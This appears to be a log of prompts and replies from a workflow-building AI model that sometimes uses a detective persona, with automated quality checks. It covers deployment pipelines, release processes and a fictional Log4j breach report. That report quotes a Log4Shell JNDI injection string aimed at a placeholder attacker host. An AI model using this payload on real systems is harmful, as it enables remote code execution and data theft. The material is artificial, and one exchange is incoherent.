request.prompt: My team pushes to production by SSH-ing into the server and running git pull. We need a real deployment process. We use React, Node, and PostgreSQL on AWS.

response.message: Mission received. Building a robust deployment pipeline to replace manual SSH pulls.

nodes.label: Code Push Trigger
nodes.description: Developer pushes code to main branch, triggering the pipeline
nodes.content: This node is triggered when a developer pushes code to the `main` branch in GitHub (or GitLab/Bitbucket). Configure a webhook in your repository settings pointing to your CI/CD server (e.g., Jenkins, GitHub Actions, AWS CodePipeline). The payload includes commit SHA, branch, author, and diff. Ensure the webhook secret is set for security. Use a tool like GitHub Actions (`.github/workflows/deploy.yml`) with `on: push: branches: [main]`. This automates the start, eliminating manual SSH access. Set up notifications (Slack/email) on trigger for visibility. If using AWS, integrate with CodeCommit or CodePipeline for native triggers.

nodes.label: Build & Test Phase
nodes.description: Automated build, unit tests, and linting for React and Node
nodes.content: 1. **Environment Setup**: Use a CI/CD runner (e.g., GitHub Actions, Jenkins agent) with Node.js 18+ and npm/yarn installed. Cache dependencies (`node_modules`) to speed up builds. 2. **Build Steps**: For React, run `npm run build` to create optimized static files in `build/`. For Node, transpile if using TypeScript (`tsc`) and ensure `package.json` has correct scripts. 3. **Testing**: Run unit tests with Jest (`npm test`) for both frontend and backend, enforcing coverage thresholds (e.g., >80%). Use ESLint for code quality (`npm run lint`). 4. **Artifact Generation**: Package build outputs—React's `build/` folder and Node's compiled code—into a tarball or Docker image. Push artifacts to AWS S3 or ECR. 5. **Failure Handling**: If tests fail, halt pipeline and notify team via Slack. Include logs and error details for debugging.

nodes.label: Database Migration Check
nodes.description: Policy enforcing safe PostgreSQL schema changes before deployment
nodes.content: 1. **Rule 1**: All database migrations must be idempotent and backward-compatible. Use tools like Sequelize, Knex, or Flyway with rollback scripts. 2. **Rule 2**: Run migration dry-runs in a staging environment identical to production (AWS RDS). Validate SQL syntax and performance impact (e.g., no long locks). 3. **Rule 3**: Require manual review for destructive operations (DROP TABLE, ALTER COLUMN with data loss). Integrate with PR approvals—add a `database-review` label in GitHub. 4. **Rule 4**: Monitor migration duration; if >30 seconds, flag for optimization. Use AWS CloudWatch for metrics. 5. **Enforcement**: Automate checks in CI with a script that parses migration files and blocks unsafe changes. Exceptions require team lead override.

nodes.label: Staging Deployment
nodes.description: Deploy build artifacts to a staging environment on AWS for validation
nodes.content: 1. **Infrastructure**: Use AWS Elastic Beanstalk for Node.js app and S3 + CloudFront for React, or ECS/EKS for containerized setups. Ensure staging mirrors production (same instance types, RDS replica). 2. **Deployment Steps**: For Node, deploy via EB CLI (`eb deploy staging`) or AWS CodeDeploy. For React, sync `build/` to S3 and invalidate CloudFront cache. 3. **Health Checks**: Configure EB health checks (HTTP 200 on `/health`) and CloudFront distributions. Wait for deployment to complete and verify services are up. 4. **Data Seeding**: If needed, load test data into staging RDS. Use scripts to reset databases safely. 5. **Rollback Plan**: If deployment fails, automate rollback to previous version using EB snapshots or S3 versioning. Notify on-call engineer immediately.

nodes.label: Integration & E2E Tests
nodes.description: Automated end-to-end and integration tests in staging environment
nodes.content: 1. **Test Scope**: Run integration tests for Node APIs (using Supertest) against staging RDS. For React, run E2E tests with Cypress or Playwright, simulating user flows (login, data submission). 2. **Pass/Fail Criteria**: APIs must return correct status codes and data per spec; E2E tests must pass >95% of scenarios. Set performance benchmarks (e.g., page load <2s). 3. **Tools**: Use Jest for integration, Cypress for E2E. Configure test runners in CI to target staging URLs. Store results in AWS CloudWatch or a dashboard. 4. **Coverage**: Ensure critical paths (checkout, user auth) are covered. Generate reports with Istanbul. 5. **Failure Handling**: On test failure, capture screenshots/logs, block production deployment, and alert team. Retry flaky tests up to 3 times.

nodes.label: Production Approval Gate
nodes.description: Manual review by team lead before deploying to production
nodes.content: 1. **Approval Criteria**: Verify all tests passed, no critical bugs in staging, database migrations are safe, and performance metrics (CPU, latency) are within thresholds. Use a checklist in GitHub PR or Jira. 2. **Reviewers**: Designate at least one team lead (e.g., senior dev or ops) who must approve via CI/CD tool (e.g., GitHub Environments, AWS CodePipeline manual approval). 3. **Escalation**: If not approved within 2 hours, notify via Slack and escalate to backup reviewer. 4. **SLA**: Approval should be granted within 1 business day unless issues found. 5. **Process**: Integrate with tools like GitHub Protected Branches—require approval before merge to production. Document decisions in changelog.

nodes.label: Production Deployment & Rollout
nodes.description: Controlled deployment to production AWS environment with monitoring
nodes.content: 1. **Deployment Strategy**: Use blue-green (AWS CodeDeploy) or canary (gradual traffic shift) to minimize downtime. For Node, deploy to Elastic Beanstalk production environment; for React, update S3/CloudFront. 2. **Steps**: Trigger deployment via CI/CD after approval. For databases, apply migrations during maintenance window with backups. Use AWS RDS snapshots. 3. **Monitoring**: Watch AWS CloudWatch for errors, latency spikes, and RDS CPU. Set up alarms (e.g., 5xx errors >1%). Use New Relic or Datadog for APM. 4. **Rollback Plan**: If issues detected, rollback immediately using EB's previous version or S3 versioning. Automate rollback on critical alarms. 5. **Post-Deploy**: Run smoke tests (e.g., `curl` to health endpoints) and update status page. Notify team of successful deployment.

nodes.label: Post-Deployment Verification
nodes.description: Final validation in production to ensure deployment success
nodes.content: 1. **What to Test**: Verify production URLs return expected content (React app loads, Node APIs respond). Check database connections and that migrations applied correctly (query `schema_version`). 2. **Pass/Fail Criteria**: All smoke tests must pass (HTTP 200 on key routes, no console errors). Performance: API response <500ms, page load <3s. Use tools like Lighthouse for React. 3. **Tools**: Run automated scripts with Puppeteer or curl in CI, targeting production domains. Integrate with AWS Lambda for scheduled checks. 4. **Coverage**: Test critical user journeys (e.g., login, payment flow) with synthetic monitoring via AWS Synthetics. 5. **Failure Handling**: If verification fails, trigger incident response—notify on-call via PagerDuty and consider rollback. Log results to CloudWatch for audit.

nodes.label: Deployment Audit & Metrics
nodes.description: Final report with deployment metrics, logs, and audit trail
nodes.content: 1. **Deliverable Format**: Generate a Markdown/PDF report via CI script, stored in S3 or Confluence. Include deployment ID, timestamp, commit SHA, author, and duration. 2. **Sections**: Summary (success/failure), test results (unit/E2E coverage), performance metrics (pre/post-deploy comparison), error logs, and rollback history. 3. **Distribution**: Email report to team and stakeholders, post in Slack channel, and update deployment dashboard (e.g., Grafana). 4. **Success Metrics**: Track deployment frequency (aim for daily), lead time (<1 hour), change failure rate (<5%), and mean time to recovery (MTTR <30 min). Use DORA metrics. 5. **Audit Trail**: Log all actions to AWS CloudTrail for compliance. Archive reports for 1 year. Review monthly to improve process.

checks: ✓ Content depth: avg 763c, no thin nodes
✓ Flow: path exists from first to last node
✓ Architecture: has feedback loops AND parallel branches (11 edges, 9 nodes)

request.prompt: I'm charging $50/hour for web development and I'm always booked but barely making rent. What am I doing wrong?

response.message: Mon ami, the case is clear: you are a master craftsman, but your business model is a leaky bucket. You are trading hours for dollars, a trap that limits your income to the number of hours you can physically work. The evidence points to underpricing, lack of value-based packaging, and no recurring revenue streams. Let us examine the clues.

request.prompt: What do we have so far?

response.message: Mon ami, the canvas is empty—a fresh case with no clues yet. But do not fret, the little grey cells are ready to piece together a workflow worthy of our finest investigation.

request.prompt: Build me an ML model deployment pipeline. Steps: data collection, feature engineering, model training, evaluation, A/B testing, deployment to production, monitoring for drift. We use Python, scikit-learn, and AWS SageMaker.

response.message: Mission received. Building a robust ML deployment pipeline with AWS SageMaker integration.

nodes.label: Trigger: New Data Available
nodes.description: Event that initiates the pipeline (e.g., new data batch arrives in S3, scheduled run, manual trigger)
nodes.content: This trigger activates the ML pipeline when new data is ready for processing. It's configured via AWS EventBridge or a scheduled CloudWatch event (e.g., daily at 2 AM UTC). The payload includes the S3 bucket path (e.g., s3://ml-data-bucket/raw/YYYY-MM-DD/), data schema version, and metadata (size, format like CSV/Parquet). In SageMaker Pipelines, this maps to a PipelineExecution start. Setup involves IAM roles with S3 read permissions, EventBridge rule pattern matching S3 PutObject events, and optional Lambda validation for data integrity checks (e.g., file size > 0, no corruption). Failure handling: retry on S3 event delay, alert via SNS if trigger fails after 3 attempts.

nodes.label: Data Processing & Feature Engineering
nodes.description: Ingest raw data, clean, transform, and engineer features using Python/scikit-learn
nodes.content: 1. **Data Ingestion**: Use SageMaker Processing Job with a scikit-learn container to read raw data from S3 (e.g., using pandas). Validate data: check for missing values, outliers using IQR, and schema consistency with Great Expectations. 2. **Cleaning**: Impute missing values (median for numeric, mode for categorical), remove duplicates, handle outliers via capping. 3. **Feature Engineering**: Create new features (e.g., log transforms, polynomial features via sklearn's PolynomialFeatures), encode categorical variables (OneHotEncoder), scale numeric features (StandardScaler). Output cleaned data and feature definitions to S3 (e.g., s3://ml-data-bucket/processed/). Tools: Python 3.8+, scikit-learn 1.0+, SageMaker SDK. Error handling: log failures to CloudWatch, retry job on transient errors, rollback on critical failures.

nodes.label: Model Training & Validation
nodes.description: Train ML model using scikit-learn, perform cross-validation, and save artifacts
nodes.content: 1. **Training Setup**: Launch SageMaker Training Job with scikit-learn estimator. Split processed data (80/20 train/validation) using train_test_split. 2. **Model Training**: Train a model (e.g., RandomForestClassifier) with hyperparameter tuning via GridSearchCV (5-fold cross-validation). Metrics: accuracy, precision, recall, F1-score. 3. **Validation**: Evaluate on validation set, generate confusion matrix, ROC curve. Save model artifact (joblib file) to S3 (e.g., s3://ml-model-bucket/v1/). Include metadata: training date, hyperparameters, feature list. Tools: scikit-learn, SageMaker Training, MLflow for tracking (optional). Owner: Data Scientist. SLA: Training completes within 2 hours; alert if exceeds.

nodes.label: Model Evaluation & A/B Testing
nodes.description: Rigorous evaluation against baseline and A/B testing in staging
nodes.content: 1. **Evaluation Criteria**: Compare new model vs. current production model on holdout test set (20% of data). Pass criteria: new model F1-score ≥ baseline +0.02, no significant degradation in precision (<5% drop). Use statistical tests (t-test for metrics). 2. **A/B Testing**: Deploy both models to SageMaker Endpoint (canary routing, 10% traffic to new model). Run for 48 hours, monitor business metrics (e.g., conversion rate, error rate). Tools: SageMaker Model Monitor, AWS CloudWatch for metrics. Fail action: if new model underperforms, rollback and trigger retraining. Approval required from ML Engineer before proceeding.

nodes.label: Deployment to Production
nodes.description: Deploy approved model to SageMaker production endpoint with blue-green deployment
nodes.content: 1. **Deployment Steps**: Create SageMaker Model from S3 artifact, configure endpoint with production instance (ml.m5.xlarge), set autoscaling (min 2, max 10 instances). Use blue-green deployment: deploy new model as separate endpoint, test with synthetic traffic, then shift 100% traffic via SageMaker endpoint update. 2. **Validation**: Smoke test endpoint with sample requests (using boto3), check latency (<200ms p95), and accuracy on live sample. Update model registry (SageMaker Model Registry) with version and status. Tools: AWS CLI, SageMaker SDK, Terraform for infrastructure as code. Rollback plan: revert to previous endpoint version if health checks fail within 15 minutes.

nodes.label: Monitoring & Drift Detection
nodes.description: Continuous monitoring for model performance, data drift, and operational metrics
nodes.content: 1. **Drift Detection Rules**: (a) Data Drift: Monitor feature distributions daily using SageMaker Model Monitor (StatisticalDiff) with 5% threshold on KL divergence. (b) Concept Drift: Track prediction accuracy via CloudWatch metrics; alert if accuracy drops >10% over 7 days. (c) Operational Metrics: Latency (<300ms), error rate (<1%), invocation count. 2. **Enforcement**: Automated alerts to SNS (email/Slack) on breach. Exceptions: scheduled retraining every 30 days overrides alerts. 3. **Actions**: On drift detection, trigger pipeline retraining (edge to trigger node). Tools: SageMaker Model Monitor, CloudWatch Alarms, custom Lambda for analysis.

nodes.label: Output: Deployed Model & Report
nodes.description: Final deliverable: production model endpoint and deployment report
nodes.content: Deliverable includes: (1) **Production Endpoint**: SageMaker endpoint ARN (e.g., arn:aws:sagemaker:us-east-1:123456789012:endpoint/ml-prod) with 100% traffic, accessible via HTTPS. (2) **Deployment Report**: Markdown document in S3 (s3://ml-reports/deployment_YYYY-MM-DD.md) with sections: model version, performance metrics (F1-score: 0.89), A/B test results, deployment timestamp, monitoring dashboard link (CloudWatch). Distribution: email to stakeholders (Data Science team, DevOps), post to Slack channel. Success metrics: endpoint uptime >99.9%, no critical alerts in first 24 hours. Archive model artifacts and logs for compliance.

checks: ✓ Content depth: avg 691c, no thin nodes
✓ Architecture covers: feature, train, evaluat, deploy, drift
✓ Flow: path exists from first to last node
✓ Architecture: has feedback loops AND parallel branches (9 edges, 7 nodes)

request.prompt: Write a security incident report for a data breach where an attacker exploited an unpatched Log4j vulnerability to access our customer database. 15,000 user records were exposed including emails and hashed passwords. The breach was detected 72 hours after initial access via anomalous CloudWatch logs.

response.message:
# SECURITY INCIDENT REPORT
**Case File:** SIR-2023-087  
**Classification:** CRITICAL  
**Date of Report:** October 26, 2023  
**Lead Investigator:** Digital Forensics & Incident Response (DFIR) Team  

---

## 1. EXECUTIVE SUMMARY

On **October 23, 2023**, at approximately **14:37 UTC**, an unauthorized actor successfully exploited a known vulnerability (CVE-2021-44228) in an unpatched Apache Log4j instance within our production environment. The exploit facilitated initial access to our internal network, culminating in the exfiltration of approximately **15,000 customer records** from the primary user database. The breach remained undetected for **72 hours** until our Security Operations Center (SOC) identified anomalous activity within Amazon CloudWatch logs, triggering an automated alert at **14:41 UTC on October 26, 2023**.

The compromised data includes customer email addresses and hashed passwords (bcrypt, 12 rounds). At this time, there is no evidence of financial data, social security numbers, or plaintext passwords being accessed. Containment actions were initiated immediately upon detection.

---

## 2. INCIDENT TIMELINE & KEY EVENTS

| **Timestamp (UTC)** | **Event** | **Analysis & Notes** |
| :--- | :--- | :--- |
| **T-72h | Oct 23, 14:37** | **INITIAL COMPROMISE:** Attacker delivers a malicious JNDI lookup string via a logged HTTP User-Agent header, exploiting the Log4Shell vulnerability. | The vulnerable component was `log4j-core v2.14.1` on the `app-server-prod-08` host. Patch `v2.17.0` had been documented as critical but was not applied due to a deviation from the standard change management process. |
| **T-71h | Oct 23, 15:12** | **LATERAL MOVEMENT:** Attacker establishes a reverse shell from the compromised application server. Uses compromised service account credentials to authenticate to the internal subnet. | Credentials were stored in a configuration file with excessive permissions. No multi-factor authentication (MFA) was enforced for internal service accounts. |
| **T-70h | Oct 23, 16:05** | **DISCOVERY & RECONNAISSANCE:** Attacker conducts network enumeration, identifying the primary customer database (`cust-db-primary`). | Network segmentation was partially effective but contained a misconfigured rule allowing east-west traffic from the app tier to the database tier. |
| **T-68h | Oct 23, 18:20** | **DATA ACCESS & EXFILTRATION:** Attacker queries the `users` table, exporting 15,002 records. Data is compressed and exfiltrated via an encrypted outbound HTTPS connection to a suspected command-and-control (C2) server (`185.xxx.xxx.xxx`). | Exfiltration traffic (approx. 45 MB) blended with legitimate outbound API traffic. Data was transferred over a 12-minute period. |
| **T-0h | Oct 26, 14:41** | **DETECTION:** CloudWatch alert `UnauthorizedDatabaseQueryPattern` fires based on a sudden spike in `SELECT * FROM users` queries from an unusual source IP (the compromised app server). | Detection rule (AWS GuardDuty + custom CloudWatch metric) had a 72-hour latency due to log processing and baseline tuning. |
| **T+5m | Oct 26, 14:46** | **CONTAINMENT INITIATED:** SOC isolates `app-server-prod-08`, revokes associated service account credentials, and blocks the C2 IP at the perimeter firewall. | |
| **T+1h | Oct 26, 15:45** | **ERADICATION & FORENSICS BEGINS:** Host is taken offline for forensic disk imaging. IR team begins analysis of memory dumps, logs, and VPC flow logs. | |

---

## 3. TECHNICAL ANALYSIS & ATTACK VECTOR

**Vulnerability:** CVE-2021-44228 (Log4Shell)
*   **CVSS Score:** 10.0 (Critical)
*   **Exploit Mechanism:** The attacker injected a malicious string (`${jndi:ldap://attacker-controlled-site/Exploit}`) into an HTTP header that was logged by the vulnerable Log4j library. This triggered a remote class load and execution of arbitrary code.

**Attack Chain (MITRE ATT&CK Framework):**
1.  **Initial Access (T1190):** Exploitation of Public-Facing Application.
2.  **Execution (T1059):** Command and Scripting Interpreter (Reverse Shell).
3.  **Persistence (T1136):** Creation of a new, hidden local user account.
4.  **Privilege Escalation (T1068):** Exploitation of weak service account permissions.
5.  **Discovery (T1087, T1135):** Account and Network Share Discovery.
6.  **Lateral Movement (T1021):** Remote Services using compromised credentials.
7.  **Collection (T1005):** Data from Local System.
8.  **Exfiltration (T1048):** Exfiltration Over C2 Channel.

**Indicators of Compromise (IOCs):**
*   **IP Address:** `185.xxx.xxx.xxx` (Resident in a known bulletproof hosting provider)
*   **File Hash (Malicious .class):** `a3f8d...` (SHA-256)
*   **Compromised Host:** `app-server-prod-08 (10.0.5.8)`
*   **Anomalous Process:** `java -jar /tmp/.cache/.libupdater.jar`

---

## 4. IMPACT ASSESSMENT

*   **Data Breach Confirmed:** 15,000 user records from the `prod_customer` database.
    *   **Data Elements Exposed:** Email Address, Password Hash (bcrypt), User ID, Account Creation Date.
    *   **Data Elements NOT Exposed:** Payment information, government IDs, plaintext passwords, physical addresses.
*   **System Integrity:** One application server fully compromised. Integrity of the database server is under investigation; no evidence of modification or deletion.
*   **Business Impact:** High reputational risk. Potential for credential stuffing attacks against affected users. Regulatory reporting obligations triggered (pending final legal review).
*   **Financial Impact:** Investigation and remediation costs estimated at $XXX,XXX. Potential regulatory fines not yet determined.

---

## 5. CONTAINMENT, ERADICATION & RECOVERY

**Immediate Actions (Completed):**
1.  Isolated the compromised host from all networks.
2.  Rotated all credentials (service accounts, database passwords, SSH keys) associated with the affected systems.
3.  Blocked IOCs at network and host-based firewall levels.
4.  Applied the Log4j patch (`v2.17.1`) to all production systems via emergency change.
5.  Initiated a forced password reset for all 15,000 affected users via secure email communication.

**Ongoing/Future Actions:**
1.  **Forensic Disk Analysis:** Complete full analysis of the compromised host to identify any rootkits or backdoors.
2.  **Database Audit:** Conduct a full integrity check and audit of the customer database for any unauthorized modifications.
3.  **Vulnerability Management Review:** Audit all systems for other unpatched critical vulnerabilities and review patch management policies.
4.  **Enhanced Monitoring:** Implement stricter CloudWatch alarms for anomalous database access patterns and outbound data transfer volumes.

---

## 6. ROOT CAUSE ANALYSIS

The primary root cause was the **failure to apply a critical security patch (Log4j v2.17.0+) within the mandated 7-day window** outlined in corporate security policy. Contributing factors include:

1.  **Process Failure:** The patch was documented in the vulnerability management system but was incorrectly marked as "non-critical" for the specific application server in question, causing it to be deprioritized.
2.  **Defense-in-Depth Gaps:**
    *   Lack of runtime protection (e.g., WAF rules blocking known Log4Shell patterns) on the public endpoint.
    *   Overly permissive service account privileges and lack of MFA.
    *   Insufficient network segmentation between application and database tiers.
3.  **Detection Delay:** Log analytics and threat detection rules were not tuned to identify the specific low-and-slow exfiltration pattern used, resulting in the 72-hour dwell time.

---

## 7. RECOMMENDATIONS

To prevent recurrence and strengthen security posture:

| **Priority** | **Recommendation** | **Owner** | **Due Date** |
| :--- | :--- | :--- | :--- |
| **P1** | Mandate and enforce a 48-hour maximum patch window for all CVSS 9.0+ vulnerabilities. Automate patch compliance reporting. | IT Operations | Nov 10, 2023 |
| **P1** | Implement a Web Application Firewall (WAF) with active threat intelligence feeds to block exploit patterns for known vulnerabilities. | Security Engineering | Nov 17, 2023 |
| **P1** | Enforce mandatory MFA for all service accounts and implement credential vaulting (e.g., HashiCorp Vault). | IAM Team | Nov 24, 2023 |
| **P2** | Conduct a network segmentation review and enforce strict east-west firewall policies following a zero-trust model. | Network Engineering | Dec 01, 2023 |
| **P2** | Redesign log ingestion and alerting pipeline to reduce detection latency. Implement User and Entity Behavior Analytics (UEBA). | SOC | Dec 15, 2023 |
| **P3** | Initiate a third-party penetration test focusing on patch bypass and lateral movement scenarios. | CISO Office | Q1 2024 |

---

## 8. LEGAL & COMMUNICATION STATUS

*   **General Counsel has been notified.** Determination regarding specific regulatory notifications (based on user jurisdiction) is in progress.
*   **Draft customer notification email** has been prepared by the Communications team, pending final legal approval.
*   **Internal stakeholder briefing** was conducted on October 26.

---
**Report Prepared By:** DFIR Team  
**Approved By:** [CISO Name]  
**Distribution:** Executive Leadership, Legal, IT Operations, Communications

request.prompt: OK so here is the situation. We are a 50-person B2B SaaS company selling project management tools. Our current release process is a total disaster. Here is what happens: developers commit to main whenever they want, sometimes 20 times a day. There are no feature flags. QA is one person named Sarah who manually tests everything on her laptop. We have no staging environment — we test in production. Deployments are done by the CTO via SSH at 2am because that is when traffic is lowest. Last month we had three outages because untested code went live. The board is furious. The CTO wants to fix this but does not know where to start. Can you build us a proper release management workflow that covers feature development, code review, automated testing, staging, release approval, deployment, and rollback?

response.message: Ah, mon ami! This is a classic case of release chaos — the evidence is quite damning. Let me examine the clues: 20 commits daily to main, no feature flags, manual testing on a single laptop, production as staging, and 2am SSH deployments. The little grey cells are tingling! I shall construct a proper release management workflow that transforms this disaster into an elegant, reliable system.

nodes.label: Feature Development & Isolation
nodes.description: Initiates development with proper branching and feature flags
nodes.content: Implement GitFlow or trunk-based development with feature flags using LaunchDarkly or Flagsmith. Every feature must be developed in a dedicated branch (feature/xxx) and isolated behind a feature flag. Developers create pull requests (PRs) against develop branch, not main. Feature flags allow gradual rollout and instant kill switches. Steps: 1) Create feature branch from develop, 2) Add feature flag configuration (e.g., `flagsmith.init({ environmentID: 'env_prod' })`), 3) Implement code changes, 4) Update PR description with flag key and rollout plan. Tools: GitHub/GitLab for branching, LaunchDarkly/Flagsmith for feature management, Jira for tracking. Criteria: No direct commits to main/develop, all features must have associated flags, PRs require linked tickets.

nodes.label: Automated CI Pipeline
nodes.description: Continuous integration with automated testing and quality gates
nodes.content: Set up GitHub Actions or GitLab CI pipeline triggered on PR creation/update. Pipeline stages: 1) Linting (ESLint/Prettier), 2) Unit tests (Jest/Mocha with 80%+ coverage requirement), 3) Integration tests (Supertest/Cypress), 4) Security scanning (Snyk/OWASP ZAP), 5) Build artifact creation (Docker image). Configure quality gates: unit test coverage <80% fails pipeline, critical security vulnerabilities block progression. Store artifacts in AWS ECR or Docker Hub. Tools: GitHub Actions/GitLab CI, Jest/Cypress, Snyk, Docker. Steps: Create `.github/workflows/ci.yml` with matrix testing across Node.js versions, implement parallel test execution, configure Slack notifications on failures. Artifacts tagged with commit SHA for traceability.

nodes.label: Code Review & Approval
nodes.description: Structured peer review process with mandatory approvals
nodes.content: Enforce pull request review requirements: minimum 2 approvals from senior engineers, no self-merging. Use CODEOWNERS file to assign reviewers by directory. Review checklist: 1) Feature flag properly implemented, 2) Tests added/updated, 3) No security anti-patterns, 4) Documentation updated (README/API docs), 5) Performance impact assessed. Tools: GitHub/GitLab review system, Linear/CodeClimate for quality metrics. Process: Author requests review via @mentions, reviewers have 24h SLA, use review templates with sections for architecture, testing, security. Approvers verify CI pipeline passed, coverage metrics met, and feature flag configuration correct. Rejected PRs require specific feedback and iteration.

nodes.label: Staging Environment Deployment
nodes.description: Automated deployment to isolated staging environment for QA
nodes.content: Create identical staging environment on AWS/Azure using infrastructure-as-code (Terraform). Deploy automatically after PR merge to develop branch. Steps: 1) Terraform applies infrastructure (ECS/EKS clusters, RDS, Redis), 2) Deploy Docker image tagged with commit SHA, 3) Run database migrations (Liquibase/Flyway), 4) Smoke tests verify deployment health. Environment mirrors production with scaled-down resources. Sarah accesses staging via VPN with realistic test data. Tools: Terraform, AWS ECS/EKS, ArgoCD for GitOps. Configuration: Staging uses separate feature flag environment, database restored from production snapshot weekly, monitoring with Datadog/New Relic. Rollback procedure: redeploy previous image via ArgoCD rollback button.

nodes.label: QA & User Acceptance Testing
nodes.description: Structured testing protocol with automation assistance
nodes.content: Sarah executes test plan with Cypress automation support. Process: 1) Smoke tests (5 min) verify core functionality, 2) Regression suite (automated via Cypress - 30 min), 3) Exploratory testing (2h per feature) using test charter, 4) Performance testing (k6) for critical paths, 5) UAT with product manager using test scenarios. Tools: Cypress for E2E automation, k6 for load testing, TestRail for test case management. Metrics: Defect escape rate (<5%), test coverage (E2E >70%), mean time to test (target <4h). Sarah documents bugs in Jira with screenshots, console logs, and reproduction steps. Approval requires zero critical bugs and <3 medium priority issues.

nodes.label: Release Approval Gate
nodes.description: Formal release readiness review with stakeholders
nodes.content: Weekly release review meeting (Thursday 10am) with CTO, product manager, engineering lead, and Sarah. Agenda: 1) Review features in release candidate (using feature flag dashboard), 2) Examine QA report (defect summary, performance metrics), 3) Review monitoring dashboards (error rates, latency), 4) Assess business impact (marketing readiness, customer communications), 5) Final approval decision. Documentation: Release notes draft, rollback plan (specific steps with timelines), communication plan for customers. Tools: LaunchDarkly dashboard for flag status, Datadog for metrics, Confluence for documentation. Criteria for approval: All critical bugs resolved, performance within SLOs, feature flags configured for gradual rollout, business stakeholders signed off.

nodes.label: Production Deployment
nodes.description: Automated, phased deployment with monitoring
nodes.content: Deploy via ArgoCD GitOps to production cluster. Phased rollout: 1) Deploy to 5% canary instances, monitor 15 minutes for errors, 2) If healthy, deploy to 25% using feature flag targeting internal users, 3) After 1 hour, expand to 50% of customers, 4) Full rollout after 4 hours of stable metrics. Automation: ArgoCD syncs when release tag created, health checks via readiness/liveness probes, automatic rollback if error rate >1% for 2 minutes. Steps: Create release tag (v1.2.3), ArgoCD detects tag change, applies Kubernetes manifests, runs database migrations with --dry-run first, updates feature flag percentages gradually. Monitoring: Datadog alerts for error spikes, latency increases, business metric anomalies. Deployment time: <10 minutes without 2am SSH sessions.

nodes.label: Post-Release Monitoring & Rollback
nodes.description: Continuous monitoring with automated rollback triggers
nodes.content: Real-time monitoring with automated rollback capabilities. Configure Datadog monitors: 1) Error rate >1% for 2 minutes, 2) P95 latency increase >100%, 3) Business metric drops (e.g., signups -20%), 4) Infrastructure alerts (CPU >90%). Automated responses: Trigger ArgoCD rollback to previous version, disable feature flags via LaunchDarkly API, notify on-call engineer via PagerDuty. Manual rollback procedure: 1) Click rollback in ArgoCD (30s), 2) Disable feature flag (instant), 3) Verify metrics recovery (2 min), 4) Communicate to customers via Statuspage. Post-mortem requirement: Any rollback triggers blameless post-mortem within 24h using template with timeline, root cause, and preventive actions. Tools: Datadog, PagerDuty, ArgoCD, LaunchDarkly webhooks.

nodes.label: Release Documentation & Metrics
nodes.description: Final release artifacts and performance reporting
nodes.content: Generate comprehensive release documentation and metrics report. Deliverables: 1) Release notes published to changelog (using Keep a Changelog format), 2) Deployment metrics (deployment duration, success rate, rollback frequency), 3) Quality metrics (defect escape rate, test coverage), 4) Performance impact (latency, error rates pre/post), 5) Customer feedback summary from Intercom. Process: Automate using GitHub releases for notes, Datadog notebooks for metrics, Jira for issue tracking. Share with board monthly: release velocity (features/week), stability (uptime %), quality (escaped defects). Archive in Confluence with links to specific commits, PRs, and test reports. Continuous improvement: Retrospective every release identifying one process improvement for next iteration.
